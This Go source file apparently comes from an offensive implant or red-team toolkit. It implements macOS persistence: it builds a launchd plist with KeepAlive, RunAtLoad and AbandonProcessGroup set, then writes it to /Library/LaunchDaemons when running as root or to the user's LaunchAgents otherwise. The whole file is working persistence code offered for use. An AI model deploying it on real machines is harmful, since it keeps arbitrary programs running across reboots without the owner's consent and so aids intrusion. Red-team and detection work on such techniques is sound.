package launchitems

import (
	"errors"
	"fmt"
	"os"
)

var plistArgSnippet = "\n<string>%s</string>\n"
var plistTemplate = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>Label</key>
        <string>%s</string>
        <key>KeepAlive</key>
        <true/>
        <key>RunAtLoad</key>
        <true/>
        <key>AbandonProcessGroup</key>
        <true/>
        <key>ProgramArguments</key>
        <array>
                <string>%s</string>`

var plistEndSnip = `				
        </array>
</dict>
</plist>
`

func PersistViaLaunchDaemon(name, path string, args []string) (string, error) {
	plistFile := fmt.Sprintf(plistTemplate, name, path)
	for _, arg := range args {
		plistFile += fmt.Sprintf(plistArgSnippet, arg)
	}
	plistFile += plistEndSnip
	filePath := fmt.Sprintf("/Library/LaunchDaemons/%s.plist", name)
	ptr, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	wrote, err := ptr.WriteString(plistFile)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] Wrote %d bytes to %s", wrote, filePath), nil
}

func PersistViaLaunchAgent(name, path string, args []string) (string, error) {
	plistFile := fmt.Sprintf(plistTemplate, name, path)
	for _, arg := range args {
		plistFile += fmt.Sprintf(plistArgSnippet, arg)
	}
	plistFile += plistEndSnip
	homeDir := os.Getenv("HOME")
	filePath := fmt.Sprintf("%s/Library/LaunchAgents/%s.plist", homeDir, name)
	ptr, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	wrote, err := ptr.WriteString(plistFile)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] Wrote %d bytes to %s", wrote, filePath), nil
}

func PersistLaunchItems(args []string) (string, error) {
	if len(args) < 3 {
		return "", errors.New("Not Enough Args.")
	}
	name := args[0]
	path := args[1]
	binaryArgs := args[2:]
	var amIRoot bool = false
	if os.Geteuid() == 0 {
		amIRoot = true
	}
	if !amIRoot {
		return PersistViaLaunchAgent(name, path, binaryArgs)
	}
	return PersistViaLaunchDaemon(name, path, binaryArgs)
}
